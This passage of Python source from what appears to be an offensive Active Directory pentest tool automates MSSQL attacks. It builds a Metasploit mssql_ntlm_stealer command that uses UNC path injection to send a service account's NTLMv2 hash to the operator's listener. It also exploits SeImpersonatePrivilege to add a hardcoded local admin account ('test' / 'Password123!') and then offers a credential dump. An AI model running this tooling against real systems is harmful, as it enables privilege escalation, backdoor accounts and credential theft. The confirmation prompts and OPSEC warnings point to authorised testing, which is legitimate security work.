            domain=domain,
            host=host,
            username=username,
            password=password,
            workflow_intent=workflow_intent,
        )


def ask_for_mssql_impersonate(
    shell: MssqlShell, *, domain: str, host: str, username: str, password: str
) -> bool:
    """Ask user if they want to exploit SeImpersonate on the target host.

    Returns whether the escalation actually succeeded — ``False`` when the
    operator declines or the escalation fails — so callers can fall back.
    """
    marked_host = mark_sensitive(host, "hostname")
    print_warning(
        "This exploit adds a new local administrator account to the target host. "
        "Revert after the engagement."
    )
    if Confirm.ask(
        f"Exploit SeImpersonatePrivilege on {marked_host} and escalate to SYSTEM?",
        default=False,
    ):
        return bool(shell.mssql_impersonate(domain, host, username, password))
    return False


def ask_for_mssql_steal(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Ask user if they want to attempt to steal NTLMv2 hash via MSSQL."""
    marked_username = mark_sensitive(username, "user")
    marked_host_steal = mark_sensitive(host, "hostname")
    _opsec_body = RichText.assemble(
        ("OPSEC: ", f"bold {_COLOR_AMBER}"),
        ("This technique forces the SQL Server service account to authenticate ", _COLOR_MUTED),
        ("to your listener via UNC path injection (xp_dirtree / xp_fileexist).\n", _COLOR_MUTED),
        ("It generates the following Windows events on the target:\n", _COLOR_MUTED),
        ("  4624  Logon (Network, Type 3)\n", f"bold {_COLOR_STEEL}"),
        ("  4625  Logon failure (if hash is not relayed in time)\n", f"bold {_COLOR_STEEL}"),
        ("\nCaptures the NTLMv2 challenge-response for ", _COLOR_MUTED),
        (mark_sensitive(username, "user"), f"bold {_COLOR_STEEL}"),
        (" on ", _COLOR_MUTED),
        (marked_host_steal, f"bold {_COLOR_STEEL}"),
        (".\nEnsure your listener (Responder/ntlmrelayx) is running before confirming.", _COLOR_MUTED),
    )
    print_panel(
        _opsec_body,
        title=RichText.assemble(
            (" UNC Path Injection ", f"bold black on {_COLOR_AMBER}"),
            ("  NTLMv2 capture via MSSQL", _COLOR_MUTED),
        ),
        border_style=_COLOR_AMBER,
        box=_BOX_ROUNDED,
        padding=(1, 2),
    )
    if Confirm.ask(
        f"Trigger NTLMv2 capture for {marked_username} on {marked_host_steal}?",
        default=False,
    ):
        shell.mssql_steal_ntlmv2(domain, host, username, password, islocal)


def run_mssql_steal_ntlmv2(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Steal NTLMv2 hash via MSSQL using Metasploit."""
    marked_username = mark_sensitive(username, "user")
    marked_password = mark_sensitive(password, "password")
    marked_host = mark_sensitive(host, "hostname")
    command = (
        f"msfconsole -x 'use auxiliary/admin/mssql/mssql_ntlm_stealer;"
        f"set username {marked_username};"
        f"set password {marked_password};"
        f"set RHOSTS {marked_host};"
        f"set USE_WINDOWS_AUTHENT {islocal};"
        f"set smbproxy {shell.myip};"
        f"run;exit'"
    )
    print_info(
        f"Triggering UNC path injection on {marked_host} "
        f"to capture NTLMv2 hash for {marked_username}."
    )
    execute_mssql_steal_ntlmv2(shell, command)


def do_mssql_steal_ntlmv2(shell: MssqlShell, args: str) -> None:
    """CLI handler for mssql_steal_ntlmv2 command.

    Steals the NTLMv2 hash of the specified user in the given domain and host,
    using the SeImpersonate vulnerability in MSSQL.

    Args:
        shell: The shell instance
        args: Space-separated string containing:
            - domain (str) - The domain name.
            - host (str) - The name or IP address of the host.
            - username (str) - The username to authenticate with MSSQL.
            - password (str) - The password for the specified username.
            - islocal (str) - If "true", the script will attempt to use local
              Windows Authentication credentials to access MSSQL. If "false",
              the script will prompt the user for credentials.

    The function prepares and executes a series of commands to steal the NTLMv2
    hash of the specified user on the target host using the SeImpersonate
    privilege. Upon successful execution, the NTLMv2 hash is printed to the console.
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning(
            "Usage: mssql_steal_NTLMv2 <domain> <host> <username> <password> <islocal>"
        )
        return
    domain = args_list[0]
    host = args_list[1]
    username = args_list[2]
    password = args_list[3]
    islocal = args_list[4]
    shell.mssql_steal_ntlmv2(domain, host, username, password, islocal)


def do_mssql_impersonate(shell: MssqlShell, args: str) -> None:
    """CLI handler for mssql_impersonate command.

    Adds a local admin user to the target host using MSSQL.

    Args:
        shell: The shell instance
        args: Space-separated string containing:
            - domain (str) - The domain name.
            - host (str) - The name or IP address of the host.
            - username (str) - The username to authenticate with MSSQL.
            - password (str) - The password for the specified username.

    The function constructs a command to add a local admin user to the target
    host using MSSQL and starts a thread to execute this command.
    """
    args_list = args.split()
    if len(args_list) != 4:
        print_warning("Usage: mssql_impersonate <domain> <host> <username> <password>")
        return
    domain = args_list[0]
    host = args_list[1]
    username = args_list[2]
    password = args_list[3]
    shell.mssql_impersonate(domain, host, username, password)


def execute_mssql_steal_ntlmv2(shell: MssqlShell, command: str) -> None:
    """Execute Metasploit command to steal NTLMv2 hash via MSSQL."""
    try:
        completed_process = shell.run_command(command, timeout=300)

        if completed_process and completed_process.stdout:
            for line_content in completed_process.stdout.splitlines():
                output_str = line_content.strip()
                print_info(output_str)
                if "completed" in output_str:
                    print_success("Exploit executed successfully")
                    break

        if completed_process and completed_process.returncode == 0:
            print_success("Process completed successfully.")
        else:
            print_error("Exploit failed or process terminated with errors.")
            if completed_process and completed_process.stderr:
                print_error(f"Details: {completed_process.stderr.strip()}")
            elif (
                completed_process
                and completed_process.stdout
                and "completed" not in completed_process.stdout
            ):
                print_error(f"Details: {completed_process.stdout.strip()}")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing Metasploit.")
        print_exception(show_locals=False, exception=e)


def execute_mssql_check_impersonate(
    shell: MssqlShell,
    *,
    command: str,
    domain: str,
    host: str,
    username: str,
    password: str,
) -> None:
    """Execute command to check for SeImpersonatePrivilege via MSSQL."""
    try:
        completed_process = shell.run_command(command, timeout=300)
        if completed_process and completed_process.returncode == 0:
            output_str = strip_ansi_codes(completed_process.stdout or "")
            if "SeImpersonatePrivilege" in output_str:
                marked_username = mark_sensitive(username, "user")
                marked_host = mark_sensitive(host, "hostname")
                print_success(
                    f"User {marked_username} with SeImpersonatePrivilege detected on host {marked_host}"
                )
                ask_for_mssql_impersonate(
                    shell,
                    domain=domain,
                    host=host,
                    username=username,
                    password=password,
                )
            else:
                print_error("Exploit failed to find SeImpersonatePrivilege.")
                if completed_process.stderr:
                    print_error(f"Details: {completed_process.stderr.strip()}")
        else:
            error_message = (
                strip_ansi_codes(completed_process.stderr or "").strip()
                if completed_process and completed_process.stderr
                else strip_ansi_codes(completed_process.stdout or "").strip()
                if completed_process and completed_process.stdout
                else ""
            )
            print_error(
                f"Command execution failed: {error_message if error_message else 'No error details'}"
            )
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing zerologon-exploit.py.")
        print_exception(show_locals=False, exception=e)


def execute_mssql_impersonate(
    shell: MssqlShell, *, command: str, domain: str, host: str
) -> None:
    """Execute command to exploit SeImpersonate via MSSQL."""
    try:
        completed_process = shell.run_command(command, timeout=300)
        if completed_process and completed_process.returncode == 0:
            output_str = strip_ansi_codes(completed_process.stdout or "")
            if "successfully" in output_str:
                marked_host = mark_sensitive(host, "hostname")
                print_success(
                    f"Test user with password Password123! added as local admin on host {marked_host}"
                )
                shell.ask_for_dump_host(domain, host, "test", "Password123!", "True")
            else:
                print_error(
                    'Exploit command ran but "successfully" message not found in output.'
                )
                if output_str:
                    print_info(f"Output: {output_str.strip()}")
                if completed_process.stderr:
                    print_error(f"Stderr: {completed_process.stderr.strip()}")
        else:
            print_error("Error executing MSSQL impersonate exploit.")
            error_message = (
                completed_process.stderr.strip()
                if completed_process and completed_process.stderr
                else completed_process.stdout.strip()
                if completed_process and completed_process.stdout
                else ""
            )
            if error_message:
                print_error(f"Details: {error_message}")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing netexec.")
        print_exception(show_locals=False, exception=e)
